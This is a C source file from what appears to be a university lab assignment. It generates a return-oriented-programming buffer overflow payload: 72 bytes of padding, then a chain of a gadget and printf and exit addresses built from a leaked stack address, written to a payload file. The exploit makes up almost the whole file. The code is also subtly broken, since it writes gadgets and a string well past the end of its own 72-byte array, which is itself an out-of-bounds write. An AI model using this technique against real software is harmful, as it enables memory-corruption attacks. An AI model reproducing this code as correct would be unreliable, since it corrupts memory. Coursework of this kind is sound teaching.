////////////////////////////////////////////////////////////////////////////////
//
//  File           : cs642-task1.c
//  Description    : Task 1
//
//   Author        : vardaan kapoor
//   Last Modified : 21st april 2025-fully working task1
//

#include "bufferoverflow_util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Write 8-byte value to memory at location addr+offset
// You will use to write values into your payload - 8-byte at a time
#define pack(addr, offset, value)                                              \
  (*((unsigned long long *)((char *)addr + offset)) = value)


int main(int argc, char **argv) {

  
  unsigned long long leaked_address_from_terminal1;


  printf("give leaked address from terminal 1 when you run task12 unix executable file in terminal 1 and it pops out stack address for particular stack configuration");
  scanf("%llx", &leaked_address_from_terminal1);




  const size_t RET_OFFSET =72;
  char payloadCollector[72];




  unsigned long long * gadgetChaining; 
  char vardaan_name[] = "Name:Vardaan_Kapoor_2911!\0"; 


  gadgetChaining = (unsigned long long *)(payloadCollector + RET_OFFSET); 


  unsigned long long rsi  = leaked_address_from_terminal1 + 20; 


  unsigned long long ppr_gadget = 0x00401608;     
  
  
  unsigned long long findExit  = 0x004011f4;   
  unsigned long long findPrintf = 0x00401174;    


  unsigned long long rdi   = leaked_address_from_terminal1 + 20; 

   
    





  
  memset(payloadCollector, 'A', RET_OFFSET); 


  *gadgetChaining++ = ppr_gadget; 
  *gadgetChaining++ = rdi;   


  *gadgetChaining++ = rsi;  


  *gadgetChaining++ = findPrintf;


  *gadgetChaining++ = findExit;   
  
  strcpy(payloadCollector + 8*14, vardaan_name); 



  write_to_file("task1-payload", payloadCollector, 8*14 + 27, FILE_CLEAR);






  exit(0);
}

